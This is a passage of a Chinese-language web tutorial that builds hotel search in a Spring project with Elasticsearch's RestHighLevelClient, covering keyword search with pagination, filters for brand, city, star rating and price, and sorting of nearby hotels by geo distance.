href="http://localhost:8089，就能看到项目页面了：">http://localhost:8089，就能看到项目页面了：</a><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494418-8049dac5-5565-459e-915b-7d06b0736b31.png#crop=0&crop=0&crop=1&crop=1&id=Cuz36&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="dbIsn"></a></p><h2 id="4-1-酒店搜索和分页"><a href="#4-1-酒店搜索和分页" class="headerlink" title="4.1.酒店搜索和分页"></a>4.1.酒店搜索和分页</h2><p>案例需求：实现黑马旅游的酒店搜索功能，完成关键字搜索和分页<br><a name="ABIHk"></a></p><h3 id="4-1-1-需求分析"><a href="#4-1-1-需求分析" class="headerlink" title="4.1.1.需求分析"></a>4.1.1.需求分析</h3><p>在项目的首页，有一个大大的搜索框，还有分页按钮：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494532-97408c6c-b5ed-4384-ab05-4ea96d0447e2.png#crop=0&crop=0&crop=1&crop=1&id=Y49XZ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />点击搜索按钮，可以看到浏览器控制台发出了请求：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494637-c39ce9d6-1997-4438-a3b8-293d1f608d64.png#crop=0&crop=0&crop=1&crop=1&id=jF0KH&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />请求参数如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494736-ccec06bc-96ab-4214-a8ab-d48a1180de79.png#crop=0&crop=0&crop=1&crop=1&id=rlN1v&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />由此可以知道，我们这个请求的信息如下：</p><ul><li>请求方式：POST</li><li>请求路径：/hotel/list</li><li>请求参数：JSON对象，包含4个字段：<ul><li>key：搜索关键字</li><li>page：页码</li><li>size：每页大小</li><li>sortBy：排序，目前暂不实现</li></ul></li><li>返回值：分页查询，需要返回分页结果PageResult，包含两个属性：<ul><li><code>total</code>：总条数</li><li><code>List&lt;HotelDoc&gt;</code>：当前页的数据</li></ul></li></ul><p>因此，我们实现业务的流程如下：</p><ul><li><p>步骤一：定义实体类，接收请求参数的JSON对象</p></li><li><p>步骤二：编写controller，接收页面的请求</p></li><li><p>步骤三：编写业务实现，利用RestHighLevelClient实现搜索、分页<br><a name="oo2u1"></a></p><h3 id="4-1-2-定义实体类"><a href="#4-1-2-定义实体类" class="headerlink" title="4.1.2.定义实体类"></a>4.1.2.定义实体类</h3><p>实体类有两个，一个是前端的请求参数实体，一个是服务端应该返回的响应结果实体。<br />1）请求参数<br />前端请求的json结构如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;搜索关键字&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;sortBy&quot;</span>: <span class="string">&quot;default&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们在<code>cn.itcast.hotel.pojo</code>包下定义一个实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestParams</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line">    <span class="keyword">private</span> Integer page;</span><br><span class="line">    <span class="keyword">private</span> Integer size;</span><br><span class="line">    <span class="keyword">private</span> String sortBy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）返回值<br />分页查询，需要返回分页结果PageResult，包含两个属性：</p></li><li><p><code>total</code>：总条数</p></li><li><p><code>List&lt;HotelDoc&gt;</code>：当前页的数据</p></li></ul><p>因此，我们在<code>cn.itcast.hotel.pojo</code>中定义返回结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long total;</span><br><span class="line">    <span class="keyword">private</span> List&lt;HotelDoc&gt; hotels;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PageResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PageResult</span><span class="params">(Long total, List&lt;HotelDoc&gt; hotels)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.total = total;</span><br><span class="line">        <span class="keyword">this</span>.hotels = hotels;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="GA0TO"></a></p><h3 id="4-1-3-定义controller"><a href="#4-1-3-定义controller" class="headerlink" title="4.1.3.定义controller"></a>4.1.3.定义controller</h3><p>定义一个HotelController，声明查询接口，满足下列要求：</p><ul><li>请求方式：Post</li><li>请求路径：/hotel/list</li><li>请求参数：对象，类型为RequestParam</li><li>返回值：PageResult，包含两个属性<ul><li><code>Long total</code>：总条数</li><li><code>List&lt;HotelDoc&gt; hotels</code>：酒店数据</li></ul></li></ul><p>因此，我们在<code>cn.itcast.hotel.web</code>中定义HotelController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hotel&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotelController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IHotelService hotelService;</span><br><span class="line"><span class="comment">// 搜索酒店数据</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/list&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PageResult <span class="title">search</span><span class="params">(<span class="meta">@RequestBody</span> RequestParams params)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hotelService.search(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="Dj6ni"></a></p><h3 id="4-1-4-实现搜索业务"><a href="#4-1-4-实现搜索业务" class="headerlink" title="4.1.4.实现搜索业务"></a>4.1.4.实现搜索业务</h3><p>我们在controller调用了IHotelService，并没有实现该方法，因此下面我们就在IHotelService中定义方法，并且去实现业务逻辑。<br />1）在<code>cn.itcast.hotel.service</code>中的<code>IHotelService</code>接口中定义一个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据关键字搜索酒店信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> params 请求参数对象，包含用户输入的关键字 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 酒店文档列表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">PageResult <span class="title">search</span><span class="params">(RequestParams params)</span></span>;</span><br></pre></td></tr></table></figure><p>2）实现搜索业务，肯定离不开RestHighLevelClient，我们需要把它注册到Spring中作为一个Bean。在<code>cn.itcast.hotel</code>中的<code>HotelDemoApplication</code>中声明这个Bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> RestHighLevelClient <span class="title">client</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>  <span class="keyword">new</span> RestHighLevelClient(RestClient.builder(</span><br><span class="line">        HttpHost.create(<span class="string">&quot;http://192.168.150.101:9200&quot;</span>)</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）在<code>cn.itcast.hotel.service.impl</code>中的<code>HotelService</code>中实现search方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PageResult <span class="title">search</span><span class="params">(RequestParams params)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1.准备Request</span></span><br><span class="line">        SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.准备DSL</span></span><br><span class="line">        <span class="comment">// 2.1.query</span></span><br><span class="line">        String key = params.getKey();</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span> || <span class="string">&quot;&quot;</span>.equals(key)) &#123;</span><br><span class="line">            request.source().query(QueryBuilders.matchAllQuery());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.source().query(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.2.分页</span></span><br><span class="line">        <span class="keyword">int</span> page = params.getPage();</span><br><span class="line">        <span class="keyword">int</span> size = params.getSize();</span><br><span class="line">        request.source().from((page - <span class="number">1</span>) * size).size(size);</span><br><span class="line">        <span class="comment">// 3.发送请求</span></span><br><span class="line">        SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">        <span class="comment">// 4.解析响应</span></span><br><span class="line">        <span class="keyword">return</span> handleResponse(response);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 结果解析</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> PageResult <span class="title">handleResponse</span><span class="params">(SearchResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    SearchHits searchHits = response.getHits();</span><br><span class="line">    <span class="comment">// 4.1.获取总条数</span></span><br><span class="line">    <span class="keyword">long</span> total = searchHits.getTotalHits().value;</span><br><span class="line">    <span class="comment">// 4.2.文档数组</span></span><br><span class="line">    SearchHit[] hits = searchHits.getHits();</span><br><span class="line">    <span class="comment">// 4.3.遍历</span></span><br><span class="line">    List&lt;HotelDoc&gt; hotels = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">        <span class="comment">// 获取文档source</span></span><br><span class="line">        String json = hit.getSourceAsString();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        HotelDoc hotelDoc = JSON.parseObject(json, HotelDoc.class);</span><br><span class="line"><span class="comment">// 放入集合</span></span><br><span class="line">        hotels.add(hotelDoc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.4.封装返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> PageResult(total, hotels);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="EW3eD"></a></p><h2 id="4-2-酒店结果过滤"><a href="#4-2-酒店结果过滤" class="headerlink" title="4.2.酒店结果过滤"></a>4.2.酒店结果过滤</h2><p>需求：添加品牌、城市、星级、价格等过滤功能<br><a name="s3UZL"></a></p><h3 id="4-2-1-需求分析"><a href="#4-2-1-需求分析" class="headerlink" title="4.2.1.需求分析"></a>4.2.1.需求分析</h3><p>在页面搜索框下面，会有一些过滤项：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494821-065a9d5d-3814-40a4-84ee-378df2d9ca6f.png#crop=0&crop=0&crop=1&crop=1&id=xUg2b&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />传递的参数如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494902-750c4893-9dee-4647-a535-10ca8908dec0.png#crop=0&crop=0&crop=1&crop=1&id=yC7p2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />包含的过滤条件有：</p><ul><li>brand：品牌值</li><li>city：城市</li><li>minPrice~maxPrice：价格范围</li><li>starName：星级</li></ul><p>我们需要做两件事情：</p><ul><li><p>修改请求参数的对象RequestParams，接收上述参数</p></li><li><p>修改业务逻辑，在搜索条件之外，添加一些过滤条件<br><a name="sMZ7z"></a></p><h3 id="4-2-2-修改实体类"><a href="#4-2-2-修改实体类" class="headerlink" title="4.2.2.修改实体类"></a>4.2.2.修改实体类</h3><p>修改在<code>cn.itcast.hotel.pojo</code>包下的实体类RequestParams：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestParams</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line">    <span class="keyword">private</span> Integer page;</span><br><span class="line">    <span class="keyword">private</span> Integer size;</span><br><span class="line">    <span class="keyword">private</span> String sortBy;</span><br><span class="line">    <span class="comment">// 下面是新增的过滤条件参数</span></span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> String starName;</span><br><span class="line">    <span class="keyword">private</span> Integer minPrice;</span><br><span class="line">    <span class="keyword">private</span> Integer maxPrice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="pTvoX"></a></p><h3 id="4-2-3-修改搜索业务"><a href="#4-2-3-修改搜索业务" class="headerlink" title="4.2.3.修改搜索业务"></a>4.2.3.修改搜索业务</h3><p>在HotelService的search方法中，只有一个地方需要修改：requet.source().query( … )其中的查询条件。<br />在之前的业务中，只有match查询，根据关键字搜索，现在要添加条件过滤，包括：</p></li><li><p>品牌过滤：是keyword类型，用term查询</p></li><li><p>星级过滤：是keyword类型，用term查询</p></li><li><p>价格过滤：是数值类型，用range查询</p></li><li><p>城市过滤：是keyword类型，用term查询</p></li></ul><p>多个查询条件组合，肯定是boolean查询来组合：</p><ul><li>关键字搜索放到must中，参与算分</li><li>其它过滤条件放到filter中，不参与算分</li></ul><p>因为条件构建的逻辑比较复杂，这里先封装为一个函数：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494985-fec63bb5-e380-4ce8-ae93-f34db02ae6bb.png#crop=0&crop=0&crop=1&crop=1&id=pikbA&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />buildBasicQuery的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildBasicQuery</span><span class="params">(RequestParams params, SearchRequest request)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.构建BooleanQuery</span></span><br><span class="line">    BoolQueryBuilder boolQuery = QueryBuilders.boolQuery();</span><br><span class="line">    <span class="comment">// 2.关键字搜索</span></span><br><span class="line">    String key = params.getKey();</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span> || <span class="string">&quot;&quot;</span>.equals(key)) &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchAllQuery());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, key));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.城市条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getCity() != <span class="keyword">null</span> &amp;&amp; !params.getCity().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;city&quot;</span>, params.getCity()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.品牌条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getBrand() != <span class="keyword">null</span> &amp;&amp; !params.getBrand().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;brand&quot;</span>, params.getBrand()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5.星级条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getStarName() != <span class="keyword">null</span> &amp;&amp; !params.getStarName().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;starName&quot;</span>, params.getStarName()));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 6.价格</span></span><br><span class="line">    <span class="keyword">if</span> (params.getMinPrice() != <span class="keyword">null</span> &amp;&amp; params.getMaxPrice() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders</span><br><span class="line">                         .rangeQuery(<span class="string">&quot;price&quot;</span>)</span><br><span class="line">                         .gte(params.getMinPrice())</span><br><span class="line">                         .lte(params.getMaxPrice())</span><br><span class="line">                        );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 7.放入source</span></span><br><span class="line">    request.source().query(boolQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="fSVGa"></a></p><h2 id="4-3-我周边的酒店"><a href="#4-3-我周边的酒店" class="headerlink" title="4.3.我周边的酒店"></a>4.3.我周边的酒店</h2><p>需求：我附近的酒店<br><a name="keepO"></a></p><h3 id="4-3-1-需求分析"><a href="#4-3-1-需求分析" class="headerlink" title="4.3.1.需求分析"></a>4.3.1.需求分析</h3><p>在酒店列表页的右侧，有一个小地图，点击地图的定位按钮，地图会找到你所在的位置：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495089-1667f471-4fd5-46d7-ac21-b9c3c51603ff.png#crop=0&crop=0&crop=1&crop=1&id=jhCy9&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />并且，在前端会发起查询请求，将你的坐标发送到服务端：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495175-e5ed1d2c-b785-4ace-a50f-1303173615fe.png#crop=0&crop=0&crop=1&crop=1&id=fFSzm&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />我们要做的事情就是基于这个location坐标，然后按照距离对周围酒店排序。实现思路如下：</p><ul><li><p>修改RequestParams参数，接收location字段</p></li><li><p>修改search方法业务逻辑，如果location有值，添加根据geo_distance排序的功能<br><a name="eEkXX"></a></p><h3 id="4-3-2-修改实体类"><a href="#4-3-2-修改实体类" class="headerlink" title="4.3.2.修改实体类"></a>4.3.2.修改实体类</h3><p>修改在<code>cn.itcast.hotel.pojo</code>包下的实体类RequestParams：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestParams</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line">    <span class="keyword">private</span> Integer page;</span><br><span class="line">    <span class="keyword">private</span> Integer size;</span><br><span class="line">    <span class="keyword">private</span> String sortBy;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> String starName;</span><br><span class="line">    <span class="keyword">private</span> Integer minPrice;</span><br><span class="line">    <span class="keyword">private</span> Integer maxPrice;</span><br><span class="line">    <span class="comment">// 我当前的地理坐标</span></span><br><span class="line">    <span class="keyword">private</span> String location;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="JPXUP"></a></p><h3 id="4-3-3-距离排序API"><a href="#4-3-3-距离排序API" class="headerlink" title="4.3.3.距离排序API"></a>4.3.3.距离排序API</h3><p>我们以前学习过排序功能，包括两种：</p></li><li><p>普通字段排序</p></li><li><p>地理坐标排序</p></li></ul><p>我们只讲了普通字段排序对应的java写法。地理坐标排序只学过DSL语法，如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;price&quot;</span>: <span class="string">&quot;asc&quot;</span>  </span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;_geo_distance&quot;</span> : &#123;</span><br><span class="line">          <span class="attr">&quot;FIELD&quot;</span> : <span class="string">&quot;纬度，经度&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;order&quot;</span> : <span class="string">&quot;asc&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;unit&quot;</span> : <span class="string">&quot;km&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的java代码示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495264-d2db6fda-f456-4275-9435-dc95ab3ec889.png#crop=0&crop=0&crop=1&crop=1&id=tpjTC&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="oMYAm"></a></p><h3 id="4-3-4-添加距离排序"><a href="#4-3-4-添加距离排序" class="headerlink" title="4.3.4.添加距离排序"></a>4.3.4.添加距离排序</h3><p>在<code>cn.itcast.hotel.service.impl</code>的<code>HotelService</code>的<code>search</code>方法中，添加一个排序功能：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495351-04ee55b5-584d-4653-9ade-7aded636e019.png#crop=0&crop=0&crop=1&crop=1&id=gG9B2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PageResult <span class="title">search</span><span class="params">(RequestParams params)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1.准备Request</span></span><br><span class="line">        SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.准备DSL</span></span><br><span class="line">        <span class="comment">// 2.1.query</span></span><br><span class="line">        buildBasicQuery(params, request);</span><br><span class="line">        <span class="comment">// 2.2.分页</span></span><br><span class="line">        <span class="keyword">int</span> page = params.getPage();</span><br><span class="line">        <span class="keyword">int</span> size = params.getSize();</span><br><span class="line">        request.source().from((page - <span class="number">1</span>) * size).size(size);</span><br><span class="line">        <span class="comment">// 2.3.排序</span></span><br><span class="line">        String location = params.getLocation();</span><br><span class="line">        <span class="keyword">if</span> (location != <span class="keyword">null</span> &amp;&amp; !location.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            request.source().sort(SortBuilders</span><br><span class="line">                                  .geoDistanceSort(<span class="string">&quot;location&quot;</span>, <span class="keyword">new</span> GeoPoint(location))</span><br><span class="line">                                  .order(SortOrder.ASC)</span><br><span class="line">                                  .unit(DistanceUnit.KILOMETERS)</span><br><span class="line">                                 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.发送请求</span></span><br><span class="line">        SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">        <span class="comment">// 4.解析响应</span></span><br><span class="line">        <span class="keyword">return</span> handleResponse(response);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="mmhdD"></a></p><h3 id="4-3-5-排序距离显示"><a href="#4-3-5-排序距离显示" class="headerlink" title="4.3.5.排序距离显示"></a>4.3.5.排序距离显示</h3><p>重启服务后，测试我的酒店功能：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495456-a4576d2e-ba29-4653-9575-a4520495ccec.png#crop=0&crop=0&crop=1&crop=1&id=mAfVx&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br 